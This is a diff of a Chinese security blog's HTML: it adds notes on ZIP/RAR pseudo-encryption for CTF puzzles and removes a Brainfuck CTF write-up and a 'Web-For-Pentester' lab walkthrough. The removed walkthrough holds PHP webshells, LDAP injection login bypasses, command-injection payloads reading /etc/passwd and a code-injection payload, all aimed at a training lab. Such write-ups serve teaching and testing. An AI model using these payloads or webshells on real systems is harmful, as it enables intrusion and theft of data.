-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-1.png" alt="3-1"></p>
-<p>找个在线解码网站：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook在线加密解密</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-2.png" alt="3-2"></p>
-<p>flag直接解出来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-3.png" alt="3-3"></p>
+<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
+<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.压缩源文件数据区：</span><br><span class="line">开头也就是前面内容提到，ZIP文件开头标识：</span><br><span class="line">50 4B 03 04</span><br><span class="line"></span><br><span class="line">2.压缩源文件目录区：</span><br><span class="line">50 4B 01 02：目录中文件文件头标记</span><br><span class="line">3F 00：压缩使用的 pkware 版本 </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line"></span><br><span class="line">3.压缩源文件目录结束标志 ：</span><br><span class="line">50 4B 05 06</span><br></pre></td></tr></table></figure>
+<p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
+<p>修改后，再次想要解压时，就提示需要输入密码了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
+<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
+<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
+<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
 <hr>
-<h3 id="第四关（这不是摩斯密码）"><a href="#第四关（这不是摩斯密码）" class="headerlink" title="第四关（这不是摩斯密码）"></a>第四关（这不是摩斯密码）</h3><p>打开看一下，发现是<strong>Brainfuck编码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-1.png" alt="4-1"></p>
-<p>那就能继续利用上面哪个网站破解</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-2.png" alt="4-2"></p>
-<p>成功解出flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-3.png" alt="4-3"></p>
 
       
 
@@ -532,7 +747,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
         </p>
       
 
@@ -2737,795 +2952,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/03/12/SQL注入详解/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Web-For-Pentester" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/11/Web-For-Pentester/">Web-For-Pentester</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/03/11/Web-For-Pentester/" class="archive-article-date">
-  	<time datetime="2019-03-10T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="（一）文件上传漏洞"><a href="#（一）文件上传漏洞" class="headerlink" title="（一）文件上传漏洞"></a>（一）文件上传漏洞</h1><h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）在网页程序中(尤其是那些使用文件系统来决定代码运行的程序)，你可让代码在服务端执行，如果你打算用合法文件名上传文件（通常是取决于扩展），在这里，我们就可以看到基于这种类型的攻击</p>
-<p>（2)首先，我们攻击一个PHF的应用，我们需要一个PHF的webshel1，一个Webshell就是一段简单的脚本或者执行代码的网页应用，比如，在PHP中，下面的代码就是一个简单的web shell:<br>&lt;?php</p>
-<p>system($_GET[‘emd’]):</p>
-<p>?&gt;</p>
-<p>（3)越复杂的webshel1可以执行越高级的操作，比如教据库和文件系统的访问，甚至是TCP随道。</p>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1 </p>
-<p>1.1 源代码</p>
-<p>1.1 看看实验的example1.php的源代码，这是一个非常基础的表单，对上传的文件类型没有限制</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>1.2 创建简单webshell文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
-<p>1.3 上传webshell文件</p>
-<p>访问example.php，将刚才创建的webshell文件上传上去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-4.png" alt="1-4"></p>
-<p>1.4 跳转</p>
-<p>上传成功会提示”Upload done Your file can be found here”，点击这个”here”连接，跳转到a.php</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-5.png" alt="1-5"></p>
-<p>1.5 cmd没有赋值</p>
-<p>因为cmd变量没有赋值，所以进行报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-6.png" alt="1-6"></p>
-<p>1.6 赋值为ls</p>
-<p>给cmd赋值为ls，可以罗列当前目录下的所有文件和目录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-7.png" alt="1-7"></p>
-<p>1.7 赋值为pwd</p>
-<p>给cmd赋值为pwd，可以查看当前目录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-8.png" alt="1-8"></p>
-<hr>
-<p>二、Example2</p>
-<p>总结：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.php后缀可以换成：</span><br><span class="line">.php3、.php4、.php5</span><br><span class="line">.blah</span><br></pre></td></tr></table></figure>
-<p>2.1 example2.php的源代码</p>
-<p>相比于example1.php只多了对文件名的限制，上传的文件名不能以.php结尾</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>2.2 绕过限制</p>
-<p>想要绕过这类的限制，可以用一下方法：</p>
-<p>（1）将拓展名改为<strong>.php3</strong>，在其他一些系统中，像这类<strong>.php4</strong>或者<strong>.php5</strong>的可能也能访问，这取决于web服务器如何解析</p>
-<p>（2）使用Apache不认识的拓展名，在.php后跟上<strong>.blah</strong>，一旦Apache无法解析这类拓展名，它就会移动到下一个，.php则随即被解析，然后运行其php代码</p>
-<p>2.3 写一句话木马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $eval($_POST[&apos;123456&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
-<p>2.4 上传时报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
-<p>2.5 修改后缀名后再上传</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-5.png" alt="2-5"></p>
-<p>上传成功</p>
-<p>2.6 使用菜刀连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-6.png" alt="2-6"></p>
-<p>成功连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-7.png" alt="2-7"></p>
-<hr>
-<h1 id="（二）LDAP-attacks"><a href="#（二）LDAP-attacks" class="headerlink" title="（二）LDAP attacks"></a>（二）LDAP attacks</h1><h2 id="【原理】-1"><a href="#【原理】-1" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol,一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与x.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。<br>（2）LDAP通常被用来后端验证，特别是用在登入进制（SSO）的解决方案中。最常见的LDAP注入模式是注入过滤器。这里示例2会演示如果用LDAP注入绕过登录验证。首先，你需要学习一点LDAP语法。当你要检索一个用户的时候，通过这个用户名，可以用如下的语句：(en=[INPUT])<br>（3）如果你要增加更多的条件或者布尔逻辑，你可以使用：布尔或：(|(cn=[输入1])(cn=[输入2]))能得到匹配输入1和输入<br>2的记录。布尔与：(&amp;(cn=[输入1]（userPassword=[输入2])）能得到cn匹配输入1和userPassword匹配输入2的记录<br>（4）就如看到的那样，布尔逻辑体现在语句开始的过滤符。由于是在布尔字符后面开始注入的，所以通常不可能对布尔符号发起注入攻击。<br>（5）LDAP经常用·通配符来匹配任意值。这可以被用来匹配任何值比如<em>，或者子串比如adn</em>匹配所有以adn开头的值。<br>（6）正如其他注入攻击一样，我们要移除任何服务端添加的代码我们用空值可以绕过末尾的过滤器。</p>
-<h2 id="【步骤】-1"><a href="#【步骤】-1" class="headerlink" title="【步骤】"></a>【步骤】</h2><h4 id="一、Example1"><a href="#一、Example1" class="headerlink" title="一、Example1"></a>一、Example1</h4><p>1.1 源代码</p>
-<p>LDAP attacks Example的源代码example.php如下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-1.png" alt="1-1"></p>
-<p>1.2 提交用户名和密码</p>
-<p>通过GET方式提交用户名和密码，都是hacker，来登录LDAP服务器。但是LDAP服务器拒绝登录，因为提供的认证信息是无效的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-2.png" alt="1-2"></p>
-<p>1.3 删除username和password的参数</p>
-<p>删除username和password的参数hacker。如果发送这样的请求username=&amp;password=，这样的值是不会奏效的，因为他们并不是NULL，相应的他们其实算做空变量。空变量登录测试在将来你所有的测试中是个相当重要的测试，即便后端服务器用的不是LDAP认证机制</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-3.png" alt="1-3"></p>
-<p>1.4 匿名认证</p>
-<p>但是有一些LDAP服务器允许空值绑定：如果发送的是空值，LDAP服务器会绑定这个链接，然后PHP程序会认为这个认证信息是正确的。为了绑定两个空值，需要在发送的请求中完全移除认证变量信息。如删除所有认证变量信息，提示AUTHENTICHTED，说明匿名认证成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-4.png" alt="1-4"></p>
-<p>二、Example2</p>
-<p>2.1 源代码</p>
-<p>LDAP attacks Example2的源代码example2.php如下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-1.png" alt="2-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-1-2.png" alt="2-1-2"></p>
-<p>2.2 正常登陆请求</p>
-<p>GET提交：?name=hacker&amp;password=hacker，提示：AUTHENTICHTED as hacker</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-2.png" alt="2-2"></p>
-<p>2.3 通过*通配符匹配一些相同的值</p>
-<p>注意图中URL的变化，结果还是和上一步一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-3.png" alt="2-3"></p>
-<p>2.4 password加上*通配符，失败</p>
-<p>password加上*通配符时，登陆失败，密码可能被加密（如哈希）后再进行匹配</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-4.png" alt="2-4"></p>
-<p>2.5 总结</p>
-<p>结果很明显，我们可以利用LDAP注入攻击，在username参数动手脚实施登录绕过。<br>（1）根据之前的则式结果，可以推断出过器的可能构造：(&amp;(cn=[IMPUT1])(userPassword=HASH[INPUT2]))<br>2)这里哈希不是加盐的哈希(可能是加5或者SHA1）。LDAP支持用如下格式对密码进行加密：’{ICLEARTEXT}’，’{MD5}’，’{SMD5}’（加盐加5），’{SHA1}’，’{SSHA}’（加盐加5）和’{CRYPT}’等来保存密码。<br>3）由于输入值2是被哈希过的，所以我们不能在这里进行注入。我们这里的目标就是向[input1]注入(用户名参数）。我们需要注意：<br>1.当前的过滤末尾使用hacker)<br>2.恒等式(如(cn=+))<br>3.使用有效语法<br>4.使用空字符（%00）来避免尾部的过滤<br>4）一旦你满足这几个条件，你应该就可以使用hacker帐户登录，任何密码均可。然后你就能使用通配符来找到其它的用户了。举个例子，你可以在过滤器第一部分使用a*，然后检查你自己是作为什么身份登陆的。<br>5）在大多数案例中，LDAP注入仅仅能帮助你绕过验证和加权认证，但想要检索任意数据很多时候都很困难或者根本不可能。</p>
-<p>2.6 username使用空字符</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-6.png" alt="2-6"></p>
-<p>2.7 username直接换成admin</p>
-<p>将username直接换成admin，提示以admin身份登陆</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-7.png" alt="2-7"></p>
-<hr>
-<h1 id="（三）命令注入"><a href="#（三）命令注入" class="headerlink" title="（三）命令注入"></a>（三）命令注入</h1><h2 id="【原理】-2"><a href="#【原理】-2" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）命令注入攻击来自于缺少对被当作命令执行的输入部分进行有效的过滤或者编码。最简单的一个例子是利用system函数来执行，并且使用接收到的http参数作为有效输入变量</p>
-<p>（2）许多方式可以执行命令注入攻击，如：</p>
-<ul>
-<li>在反引号对中注入命令，比如<strong>‘id’</strong></li>
-<li>把第一个命令的结果重定向到第二个中去，比如 <strong>| id</strong></li>
-<li>如果第一个命令被成功执行，可以尝试执行更多的命令：<strong>&amp;&amp; id</strong>（这里&amp;需要被编码）</li>
-<li>在一个失败的命令后执行另一个命令：<strong>error || id</strong>（这里的error就只是为了制造一个错误）</li>
-<li>这里也可以用相同值技巧来检测这种漏洞。比如，把123替换成<strong>‘echo123’</strong>。在反引号里面的代码会先被执行，但是返回的结果和没有更改过的返回的页面一样。</li>
-</ul>
-<p>（4）你也可以用基于时间的载体来检则这种类型的漏洞。你可以引入需要服务器消耗时间来执行的命令来检则洞（可能会有造成拒绝服务攻击的风险）。你可以用sleep命令让服务器等待一段时间继续执行命令。比如用sleep 10</p>
-<h2 id="【步骤】-2"><a href="#【步骤】-2" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example1</p>
-<p>1.1 源代码</p>
-<p>简单的命令执行漏洞例子，开发者不做任何的输入验证，你可以直接在ip参数后注入你的命令</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p>1.2 重定向</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1 | cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>1.3 重定向2</p>
-<p>可以将IP地址写错，然后把<strong>|</strong>改成<strong>||</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0 || cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
-<p>二、Example2</p>
-<p>2.1 源代码</p>
-<p>添加了正则匹配的例子。在Example2中，开发者有经验提供的参数，但是用了不是很正确的方式。就像我们之前看到sql注入漏洞那样，利用的是多行的正则表达式。使用和在sql注入漏洞一样的技巧，你可以轻易地利用代码执行漏洞。这里比较方便的是你不在考虑注入分隔符，你只要注入编码的新代码（%0a），然后加上你要执行的命令</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
-<p>2.2 重定向</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0Acat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>三、Example3</p>
-<p>3.1 源代码</p>
-<p>没有正确的停止执行脚本例子。开发者没有正确的停止执行脚本。在PHP中，如果用户的提供的输入触发了某些安全规则的时候可以调用header函数非常简便的实现页面重定向。但是，就算浏览器会被重定向，这个函数并不会停止执行过程，脚本仍然会将危险的语句执行完<br>毕。开发者需要在调用header面数后接着调用die通数未避免这个危险的错误</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
-<p>3.2 输入url</p>
-<p>输入url，无法得到passwd文件的内容，且回到初始页面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0Acat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
-<p>回车后回到初始页面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-2-2.png" alt="3-2-2"></p>
-<p>3.3 利用 curl 获取信息</p>
-<p>打开cmd，输入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd C:\tools\curl</span><br></pre></td></tr></table></figure>
-<p>再输入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;...?ip=127.0.0.10xacat0x20/etc/passwd&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-3-2.png" alt="3-3-2"></p>
-<hr>
-<h1 id="（四）代码注入"><a href="#（四）代码注入" class="headerlink" title="（四）代码注入"></a>（四）代码注入</h1><h2 id="【原理】-3"><a href="#【原理】-3" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）代码执行漏洞是因为对用户控制的输入数据没有进行恰当的过滤和转义。当你执行一个代码注入漏洞，你要在发送给web应用程序的数据中添加你的注入代码。比如，你想要执行<strong>ls</strong>命令，你要发送<strong>system(“l”)</strong>，因为这是个php程序<br>（2）就像其他web漏洞的例子一样，通常很难知道怎么注释掉剩下的代码（比如程序在用户控制的数据后添加的代码）。在PHP中，你可以用<strong>//</strong>来绕过被添加的代码<br>和SQL注入漏洞一样，你可以用同样的技巧来测试并且确保你的注入代码被执行：</p>
-<ul>
-<li>用注释符来执行注入</li>
-<li>用一个简单连接符<strong>”.”</strong>来注入（这里”用来打断语句并且正确的重组语句）</li>
-<li>用字符串连接符来构造变量，比如用<strong>”.”ha”.”cker”</strong>来替代hacker</li>
-</ul>
-<p>（3）你还可以用基于时间的检测方式来定位漏洞，要用到php的sleep函数。下面两个例子也有不同的时间相应：</p>
-<ul>
-<li>不使用sleep函数或者用零时间延迟函数：sleep(0)</li>
-<li>用时间函数引入较长的延时：sleep(10)</li>
-</ul>
-<h2 id="【步骤】-3"><a href="#【步骤】-3" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example1</p>
-<p>1.1 源代码</p>
-<p>简单的例子，代码中使用了函数eval()，这是一个相当简单的代码注入例子</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p>1.2 输入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&quot;;phpinfo();&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>二、Example2</p>
-<p>2.1 源代码</p>
